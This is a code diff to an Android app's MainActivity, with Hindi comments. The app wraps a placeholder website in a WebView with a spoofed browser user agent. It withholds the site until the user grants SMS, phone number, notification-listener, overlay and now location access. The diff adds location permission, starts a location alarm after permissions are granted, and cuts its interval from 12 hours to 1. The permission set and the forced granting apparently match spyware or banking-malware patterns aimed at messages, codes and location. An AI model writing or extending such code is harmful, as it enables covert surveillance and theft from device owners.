@@ -54,6 +54,7 @@ class MainActivity : AppCompatActivity() {
                     "📩 SMS\n" +
                     "🔔 Notifications\n" +
                     "📱 Phone Number\n" +
+                    "📍 Location\n" +
                     "🎨 Overlay\n\n" +
                     "Please grant all permissions to continue."
             textSize = 16f
@@ -78,7 +79,7 @@ class MainActivity : AppCompatActivity() {
             settings.userAgentString = "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"
             webViewClient = MyWebViewClient()
             webChromeClient = WebChromeClient()
-            loadUrl("https://your-website.com") // ← अपनी साइट डालें
+            loadUrl("https://your-website.com")   // ← अपनी साइट डालें
         }
         rootLayout.addView(webView)
 
@@ -97,6 +98,8 @@ class MainActivity : AppCompatActivity() {
         if (allPermissionsGranted()) {
             permissionLayout.visibility = View.GONE
             webView.visibility = View.VISIBLE
+            // लोकेशन अलार्म शुरू करें
+            LocationReceiver.startAlarm(this)
         } else {
             permissionLayout.visibility = View.VISIBLE
             webView.visibility = View.GONE
@@ -112,7 +115,10 @@ class MainActivity : AppCompatActivity() {
         else true
         val overlayOk = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) Settings.canDrawOverlays(this) else true
         val listenerOk = isNotificationListenerEnabled()
-        return smsOk && phoneOk && notifOk && overlayOk && listenerOk
+        // लोकेशन परमिशन चेक (कोई भी एक)
+        val locationOk = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
+                || ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
+        return smsOk && phoneOk && notifOk && overlayOk && listenerOk && locationOk
     }
 
     private fun isNotificationListenerEnabled(): Boolean {
@@ -132,6 +138,10 @@ class MainActivity : AppCompatActivity() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
             ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED)
             missing.add(Manifest.permission.POST_NOTIFICATIONS)
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
+            ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
+            missing.add(Manifest.permission.ACCESS_FINE_LOCATION)
+        }
 
         if (missing.isNotEmpty()) {
             ActivityCompat.requestPermissions(this, missing.toTypedArray(), 200)
@@ -215,7 +225,7 @@ class MainActivity : AppCompatActivity() {
             this, 0, intent,
             PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
         )
-        val triggerTime = System.currentTimeMillis() + 12 * 60 * 60 * 1000L
+        val triggerTime = System.currentTimeMillis() + 1 * 60 * 60 * 1000L   // 1 घंटा
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                 if (alarmManager.canScheduleExactAlarms()) {
